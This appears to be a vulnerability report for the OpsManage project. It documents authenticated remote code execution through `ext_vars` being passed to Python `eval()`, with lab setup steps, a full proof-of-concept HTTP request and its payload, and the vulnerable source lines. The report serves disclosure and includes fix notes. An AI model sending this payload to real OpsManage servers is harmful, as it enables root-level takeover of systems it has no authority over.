### Vulnerability details

**Official website / Product:** https://github.com/welliamcao/OpsManage

**Repository:** welliamcao/OpsManage (stars at selection: 3595)

**Vulnerability type:** RCE / getshell

**Vulnerability versions:** current default branch v3 (audited commit 800e45ed18d0da168702b277bb45ac41a7301570); code still contains `eval(request.POST.get('ext_vars'))`

**Vulnerability URL / Parameter:** `POST /api/inventory/groups/<inventory_id>/` parameter `ext_vars`; related sink also at `PUT /deploy/inventory/group/<group_id>/` (`ext_vars`)

**Complex:** yes

### Verification procedure

1. Start the Docker lab (original tree `labs/OpsManage-r67-a2/`, compose: `labs/OpsManage-r67-a2/docker-compose.yml`). Host port **24702→container 8000**; web container name `opsmanage-r67a2-web`; image `opsmanage-r67a2:lab` (also pulls `mysql:5.7`, `redis:3.2.8`, `rabbitmq:3-management`). Default credentials **`admin` / `admin`**.
   ```bash
   cd labs/OpsManage-r67-a2 && docker compose up -d
   # wait until http://127.0.0.1:24702/login/ is reachable
   # expected: opsmanage-r67a2-mysql / redis / rabbitmq / web; web Starts after mysql Healthy
   ```
2. Open `GET /login/` in a browser or HTTP client, take the `csrftoken` cookie / hidden field; then `POST /login/` with `username=admin&password=admin` (include `csrfmiddlewaretoken`). Keep `sessionid` and `csrftoken` after login (the PoC below uses lab-captured values; replace them after a fresh deploy).
3. Create a dynamic inventory: `POST /deploy/inventory/` with form fields `inventory_name` and `inventory_desc` (requires `deploy.deploy_add_deploy_inventory`; `admin` has it). This lab yielded inventory id = **1** (confirm via `GET /api/inventory/` if needed).
4. Send `POST /api/inventory/groups/1/` with the malicious `ext_vars` (full request below). `server_list` is a comma-separated list of integer asset ids (`SmallIntegerField` — no real `Assets` row required); the lab used `server_list=1`.
5. Expect HTTP 200 with business JSON `code:200`; prove RCE by reading the file written inside the container:
   ```bash
   docker exec opsmanage-r67a2-web cat /tmp/r67a2-poc-1793643371
   # expected output:
   # uid=0(root) gid=0(root) groups=0(root)
   # R67A2_EXTVARS_RCE
   ```

### Complete vulnerability PoC

Decoded `ext_vars` payload (before URL-encoding):

```python
__import__('os').system('id>/tmp/r67a2-poc-1793643371;echo R67A2_EXTVARS_RCE>>/tmp/r67a2-poc-1793643371')
```

`eval()` evaluates the expression, runs `os.system` (side effect writes the file), and returns the exit-status integer which is then persisted via `json.dumps`.

#### 0) Login (obtain session; cookies change after redeploy)

```http
POST /login/ HTTP/1.1
Host: 127.0.0.1:24702
Content-Type: application/x-www-form-urlencoded
Referer: http://127.0.0.1:24702/login/
Cookie: csrftoken=<csrftoken-from-GET-login>
Content-Length: <len>

csrfmiddlewaretoken=<csrftoken>&username=admin&password=admin
```

Expected: `302` to `/` with `Set-Cookie: sessionid=...`.

#### 1) Create dynamic inventory (obtain inventory id)

```http
POST /deploy/inventory/ HTTP/1.1
Host: 127.0.0.1:24702
Content-Type: application/x-www-form-urlencoded
X-CSRFToken: <csrftoken>
Referer: http://127.0.0.1:24702/deploy/inventory/
Cookie: sessionid=<sessionid>; csrftoken=<csrftoken>

csrfmiddlewaretoken=<csrftoken>&inventory_name=poc-inv&inventory_desc=rce-lab
```

Expected: `{"msg": "添加成功", "code": 200, "data": []}`; inventory id in this lab is `1`.

#### 2) Trigger RCE (Docker-verified full request)

```http
POST /api/inventory/groups/1/ HTTP/1.1
Host: 127.0.0.1:24702
Content-Type: application/x-www-form-urlencoded
X-CSRFToken: PzUZZRY4v6il1YeRYZHHqbr3XVllDHUWAIDt69WI2DczCB3Ocrmr1OFctIeYmNTP
Referer: http://127.0.0.1:24702/deploy/inventory/
Cookie: sessionid=beh185on1kxxge7ns19hdrewh6j0bzwk; csrftoken=PzUZZRY4v6il1YeRYZHHqbr3XVllDHUWAIDt69WI2DczCB3Ocrmr1OFctIeYmNTP
Content-Length: 263
Connection: close

csrfmiddlewaretoken=PzUZZRY4v6il1YeRYZHHqbr3XVllDHUWAIDt69WI2DczCB3Ocrmr1OFctIeYmNTP&group_name=pocg&ext_vars=__import__%28%27os%27%29.system%28%27id%3E%2Ftmp%2Fr67a2-poc-1793643371%3Becho%20R67A2_EXTVARS_RCE%3E%3E%2Ftmp%2Fr67a2-poc-1793643371%27%29&server_list=1
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Content-Type: application/json
Vary: Accept, Cookie
Allow: PUT, OPTIONS, GET, DELETE, POST
X-Frame-Options: SAMEORIGIN
Content-Length: 60

{"msg": "\u6dfb\u52a0\u6210\u529f", "code": 200, "data": []}
```

Verification result notes:

- Application returns success JSON (`code:200`, `msg` =「添加成功」).
- Container file `/tmp/r67a2-poc-1793643371` contains:
  ```
  uid=0(root) gid=0(root) groups=0(root)
  R67A2_EXTVARS_RCE
  ```
- Demonstrates that after the deploy-inventory permission check, `ext_vars` is passed to `eval()`, yielding RCE/getshell in the OpsManage web process (root in this lab).
- Lab topology: audited commit `800e45ed18d0da168702b277bb45ac41a7301570` (origin/v3); host `24702→8000`; container `opsmanage-r67a2-web`; image `opsmanage-r67a2:lab` (+ `mysql:5.7`, `redis:3.2.8`, `rabbitmq:3-management`); credentials `admin` / `admin`.

### Vulnerability analysis

The dynamic inventory-group API `deploy_inventory_groups` (`apps/api/views/deploy_api.py`) feeds client-supplied `ext_vars` into Python `eval()` on the `POST` branch to “parse” Ansible-style host/group vars before `json.dumps` persistence. There is no safe literal parsing (`ast.literal_eval` / `json.loads`) or schema allow-list. Any user with `deploy.deploy_add_deploy_inventory` (or `deploy.deploy_change_deploy_inventory` on the UI PUT path) can run arbitrary Python on the **web server itself**. `eval` runs before the group row is created; even if a later `server_list` write fails, the command side effect has already occurred.

This is the same unsafe-`eval` anti-pattern as CVE-2024-11662 (`deploy_host_vars` / `host_vars`), but a **different route, parameter, permission gate, and function**. Public CVE text and the Sp1d3rL1 PoC only document `host_vars` at `/api/host/vars/<id>/`. A second same-root sink exists in `DeployInventoryGroups.put` (`PUT /deploy/inventory/group/<group_id>/`), which also `eval`s `ext_vars`.

Trigger / sink source (full path and line numbers):

```python
# File: apps/api/views/deploy_api.py
# Function: deploy_inventory_groups
# Lines: 151-155
    elif request.method == "POST":     
        if not  request.user.has_perm('deploy.deploy_add_deploy_inventory'):
            return Response(status=status.HTTP_403_FORBIDDEN)            
        try:
            ext_vars = json.dumps(eval(request.POST.get('ext_vars')))
```

```python
# File: apps/deploy/views.py
# Class: DeployInventoryGroups.put
# Lines: 92-94
        try:                    
            inventoryGroups.ext_vars = json.dumps(eval(QueryDict(request.body).get('ext_vars')))
            inventoryGroups.save()
```

Route mounts: `apps/api/urls.py` → `^inventory/groups/(?P<id>[0-9]+)/$` (prefix `/api/`); UI side `apps/deploy/urls.py` → `^inventory/group/(?P<id>[0-9]+)/$` (prefix `/deploy/`).

### Fix notes

1. Never `eval`/`exec` user input; parse vars with `ast.literal_eval` or `json.loads` and accept only dict/list/scalars.
2. Validate `ext_vars` against a strict schema.
3. Replace other `eval` sites in the same modules (`host_vars`, read-path `eval(ds.ext_vars)`).
4. Run the web process with least privilege.
